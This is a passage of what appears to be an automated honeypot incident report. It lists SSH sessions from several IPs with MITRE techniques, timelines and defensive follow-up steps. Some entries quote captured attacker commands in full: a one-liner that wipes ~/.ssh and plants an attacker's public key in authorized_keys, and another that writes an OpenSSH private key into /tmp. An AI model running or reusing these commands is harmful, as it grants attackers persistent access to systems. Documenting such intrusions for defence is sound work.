| `2026-09-12 13:22:41` | `cowrie.login.success` |
| `2026-09-12 13:22:42` | `cowrie.session.params` |
| `2026-09-12 13:22:42` | `cowrie.command.input` |
| `2026-09-12 13:22:42` | `cowrie.log.closed` |
| `2026-09-12 13:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20c3c448743d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:24 |
| **Last Seen** | 2026-09-12 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:24:15` | `cowrie.session.connect` |
| `2026-09-12 13:24:15` | `cowrie.client.version` |
| `2026-09-12 13:24:15` | `cowrie.client.kex` |
| `2026-09-12 13:24:16` | `cowrie.login.success` |
| `2026-09-12 13:24:16` | `cowrie.session.params` |
| `2026-09-12 13:24:16` | `cowrie.command.input` |
| `2026-09-12 13:24:16` | `cowrie.log.closed` |
| `2026-09-12 13:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdd00fed0db8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:25 |
| **Last Seen** | 2026-09-12 13:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:25:51` | `cowrie.session.connect` |
| `2026-09-12 13:25:51` | `cowrie.client.version` |
| `2026-09-12 13:25:51` | `cowrie.client.kex` |
| `2026-09-12 13:25:52` | `cowrie.login.success` |
| `2026-09-12 13:25:52` | `cowrie.session.params` |
| `2026-09-12 13:25:52` | `cowrie.command.input` |
| `2026-09-12 13:25:53` | `cowrie.log.closed` |
| `2026-09-12 13:25:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7da22488e26

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-09-12 13:25 |
| **Last Seen** | 2026-09-12 13:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:25:59` | `cowrie.session.connect` |
| `2026-09-12 13:25:59` | `cowrie.client.version` |
| `2026-09-12 13:25:59` | `cowrie.client.kex` |
| `2026-09-12 13:26:00` | `cowrie.login.success` |
| `2026-09-12 13:26:00` | `cowrie.session.params` |
| `2026-09-12 13:26:00` | `cowrie.command.input` |
| `2026-09-12 13:26:00` | `cowrie.command.failed` |
| `2026-09-12 13:26:01` | `cowrie.log.closed` |
| `2026-09-12 13:26:01` | `cowrie.session.params` |
| `2026-09-12 13:26:01` | `cowrie.command.input` |
| `2026-09-12 13:26:01` | `cowrie.session.file_download` |
| `2026-09-12 13:26:01` | `cowrie.log.closed` |
| `2026-09-12 13:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92588868e0fe

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-09-12 13:26 |
| **Last Seen** | 2026-09-12 13:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:26:02` | `cowrie.session.connect` |
| `2026-09-12 13:26:02` | `cowrie.client.version` |
| `2026-09-12 13:26:02` | `cowrie.client.kex` |
| `2026-09-12 13:26:05` | `cowrie.login.success` |
| `2026-09-12 13:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc8a64b3209b

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-09-12 13:26 |
| **Last Seen** | 2026-09-12 13:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:26:06` | `cowrie.session.connect` |
| `2026-09-12 13:26:06` | `cowrie.client.version` |
| `2026-09-12 13:26:06` | `cowrie.client.kex` |
| `2026-09-12 13:26:06` | `cowrie.login.success` |
| `2026-09-12 13:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-864b2e0a3ec3

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-09-12 13:26 |
| **Last Seen** | 2026-09-12 13:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:26:37` | `cowrie.session.connect` |
| `2026-09-12 13:26:37` | `cowrie.client.version` |
| `2026-09-12 13:26:37` | `cowrie.client.kex` |
| `2026-09-12 13:26:38` | `cowrie.login.success` |
| `2026-09-12 13:26:39` | `cowrie.session.params` |
| `2026-09-12 13:26:39` | `cowrie.command.input` |
| `2026-09-12 13:26:39` | `cowrie.command.failed` |
| `2026-09-12 13:26:40` | `cowrie.log.closed` |
| `2026-09-12 13:26:40` | `cowrie.session.params` |
| `2026-09-12 13:26:40` | `cowrie.command.input` |
| `2026-09-12 13:26:41` | `cowrie.session.file_download` |
| `2026-09-12 13:26:41` | `cowrie.log.closed` |
| `2026-09-12 13:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11af49d97ab2

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-09-12 13:26 |
| **Last Seen** | 2026-09-12 13:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:26:41` | `cowrie.session.connect` |
| `2026-09-12 13:26:41` | `cowrie.client.version` |
| `2026-09-12 13:26:41` | `cowrie.client.kex` |
| `2026-09-12 13:26:42` | `cowrie.login.success` |
| `2026-09-12 13:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d45712fcc97c

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-09-12 13:26 |
| **Last Seen** | 2026-09-12 13:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:26:43` | `cowrie.session.connect` |
| `2026-09-12 13:26:43` | `cowrie.client.version` |
| `2026-09-12 13:26:44` | `cowrie.client.kex` |
| `2026-09-12 13:26:46` | `cowrie.login.success` |
| `2026-09-12 13:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-873d6070c62d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:27 |
| **Last Seen** | 2026-09-12 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:27:31` | `cowrie.session.connect` |
| `2026-09-12 13:27:31` | `cowrie.client.version` |
| `2026-09-12 13:27:31` | `cowrie.client.kex` |
| `2026-09-12 13:27:32` | `cowrie.login.success` |
| `2026-09-12 13:27:33` | `cowrie.session.params` |
| `2026-09-12 13:27:33` | `cowrie.command.input` |
| `2026-09-12 13:27:33` | `cowrie.log.closed` |
| `2026-09-12 13:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-815283c930f5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:29 |
| **Last Seen** | 2026-09-12 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:29:09` | `cowrie.session.connect` |
| `2026-09-12 13:29:09` | `cowrie.client.version` |
| `2026-09-12 13:29:09` | `cowrie.client.kex` |
| `2026-09-12 13:29:10` | `cowrie.login.success` |
| `2026-09-12 13:29:10` | `cowrie.session.params` |
| `2026-09-12 13:29:10` | `cowrie.command.input` |
| `2026-09-12 13:29:10` | `cowrie.log.closed` |
| `2026-09-12 13:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e933854dbae

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:30 |
| **Last Seen** | 2026-09-12 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:30:45` | `cowrie.session.connect` |
| `2026-09-12 13:30:45` | `cowrie.client.version` |
| `2026-09-12 13:30:45` | `cowrie.client.kex` |
| `2026-09-12 13:30:45` | `cowrie.login.success` |
| `2026-09-12 13:30:46` | `cowrie.session.params` |
| `2026-09-12 13:30:46` | `cowrie.command.input` |
| `2026-09-12 13:30:46` | `cowrie.log.closed` |
| `2026-09-12 13:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-145d80b5c765

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:32 |
| **Last Seen** | 2026-09-12 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:32:24` | `cowrie.session.connect` |
| `2026-09-12 13:32:24` | `cowrie.client.version` |
| `2026-09-12 13:32:24` | `cowrie.client.kex` |
| `2026-09-12 13:32:25` | `cowrie.login.success` |
| `2026-09-12 13:32:25` | `cowrie.session.params` |
| `2026-09-12 13:32:25` | `cowrie.command.input` |
| `2026-09-12 13:32:25` | `cowrie.log.closed` |
| `2026-09-12 13:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d22fb6ec09

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:34 |
| **Last Seen** | 2026-09-12 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:34:05` | `cowrie.session.connect` |
| `2026-09-12 13:34:05` | `cowrie.client.version` |
| `2026-09-12 13:34:05` | `cowrie.client.kex` |
| `2026-09-12 13:34:05` | `cowrie.login.success` |
| `2026-09-12 13:34:06` | `cowrie.session.params` |
| `2026-09-12 13:34:06` | `cowrie.command.input` |
| `2026-09-12 13:34:06` | `cowrie.log.closed` |
| `2026-09-12 13:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c36c0287a71

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:35 |
| **Last Seen** | 2026-09-12 13:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:35:41` | `cowrie.session.connect` |
| `2026-09-12 13:35:41` | `cowrie.client.version` |
| `2026-09-12 13:35:41` | `cowrie.client.kex` |
| `2026-09-12 13:35:42` | `cowrie.login.success` |
| `2026-09-12 13:35:43` | `cowrie.session.params` |
| `2026-09-12 13:35:43` | `cowrie.command.input` |
| `2026-09-12 13:35:43` | `cowrie.log.closed` |
| `2026-09-12 13:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1f50a6b9870

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:37 |
| **Last Seen** | 2026-09-12 13:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:37:17` | `cowrie.session.connect` |
| `2026-09-12 13:37:17` | `cowrie.client.version` |
| `2026-09-12 13:37:17` | `cowrie.client.kex` |
| `2026-09-12 13:37:17` | `cowrie.login.success` |
| `2026-09-12 13:37:18` | `cowrie.session.params` |
| `2026-09-12 13:37:18` | `cowrie.command.input` |
| `2026-09-12 13:37:18` | `cowrie.log.closed` |
| `2026-09-12 13:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d4378daca0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:38 |
| **Last Seen** | 2026-09-12 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:38:57` | `cowrie.session.connect` |
| `2026-09-12 13:38:57` | `cowrie.client.version` |
| `2026-09-12 13:38:58` | `cowrie.client.kex` |
| `2026-09-12 13:38:58` | `cowrie.login.success` |
| `2026-09-12 13:38:58` | `cowrie.session.params` |
| `2026-09-12 13:38:58` | `cowrie.command.input` |
| `2026-09-12 13:38:59` | `cowrie.log.closed` |
| `2026-09-12 13:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb8b0107cfb2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:40 |
| **Last Seen** | 2026-09-12 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:40:38` | `cowrie.session.connect` |
| `2026-09-12 13:40:38` | `cowrie.client.version` |
| `2026-09-12 13:40:38` | `cowrie.client.kex` |
| `2026-09-12 13:40:38` | `cowrie.login.success` |
| `2026-09-12 13:40:39` | `cowrie.session.params` |
| `2026-09-12 13:40:39` | `cowrie.command.input` |
| `2026-09-12 13:40:39` | `cowrie.log.closed` |
| `2026-09-12 13:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f9f0de3b0be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:42 |
| **Last Seen** | 2026-09-12 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:42:14` | `cowrie.session.connect` |
| `2026-09-12 13:42:14` | `cowrie.client.version` |
| `2026-09-12 13:42:14` | `cowrie.client.kex` |
| `2026-09-12 13:42:14` | `cowrie.login.success` |
| `2026-09-12 13:42:15` | `cowrie.session.params` |
| `2026-09-12 13:42:15` | `cowrie.command.input` |
| `2026-09-12 13:42:15` | `cowrie.log.closed` |
| `2026-09-12 13:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca4e2984e1f7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:43 |
| **Last Seen** | 2026-09-12 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:43:50` | `cowrie.session.connect` |
| `2026-09-12 13:43:50` | `cowrie.client.version` |
| `2026-09-12 13:43:50` | `cowrie.client.kex` |
| `2026-09-12 13:43:50` | `cowrie.login.success` |
| `2026-09-12 13:43:51` | `cowrie.session.params` |
| `2026-09-12 13:43:51` | `cowrie.command.input` |
| `2026-09-12 13:43:51` | `cowrie.log.closed` |
| `2026-09-12 13:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470154a09f23

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:45 |
| **Last Seen** | 2026-09-12 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:45:29` | `cowrie.session.connect` |
| `2026-09-12 13:45:29` | `cowrie.client.version` |
| `2026-09-12 13:45:30` | `cowrie.client.kex` |
| `2026-09-12 13:45:30` | `cowrie.login.success` |
| `2026-09-12 13:45:31` | `cowrie.session.params` |
| `2026-09-12 13:45:31` | `cowrie.command.input` |
| `2026-09-12 13:45:31` | `cowrie.log.closed` |
| `2026-09-12 13:45:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4628f3b2b9e0

| Field | Detail |
|---|---|
| **Source IP** | `167.233.164[.]13` |
| **First Seen** | 2026-09-12 13:46 |
| **Last Seen** | 2026-09-12 13:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:46:17` | `cowrie.session.connect` |
| `2026-09-12 13:46:17` | `cowrie.client.version` |
| `2026-09-12 13:46:17` | `cowrie.client.kex` |
| `2026-09-12 13:46:18` | `cowrie.login.success` |
| `2026-09-12 13:46:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.233.164[.]13` to AbuseIPDB if not already reported
- [ ] Block `167.233.164[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2943dbacf216

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-12 13:46 |
| **Last Seen** | 2026-09-12 13:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:46:18` | `cowrie.session.connect` |
| `2026-09-12 13:46:18` | `cowrie.client.version` |
| `2026-09-12 13:46:18` | `cowrie.client.kex` |
| `2026-09-12 13:46:18` | `cowrie.login.success` |
| `2026-09-12 13:46:20` | `cowrie.session.params` |
| `2026-09-12 13:46:20` | `cowrie.command.input` |
| `2026-09-12 13:46:20` | `cowrie.session.file_download` |
| `2026-09-12 13:46:20` | `cowrie.session.file_download` |
| `2026-09-12 13:46:20` | `cowrie.log.closed` |
| `2026-09-12 13:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb0f90b5c139

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:47 |
| **Last Seen** | 2026-09-12 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:47:11` | `cowrie.session.connect` |
| `2026-09-12 13:47:11` | `cowrie.client.version` |
| `2026-09-12 13:47:11` | `cowrie.client.kex` |
| `2026-09-12 13:47:11` | `cowrie.login.success` |
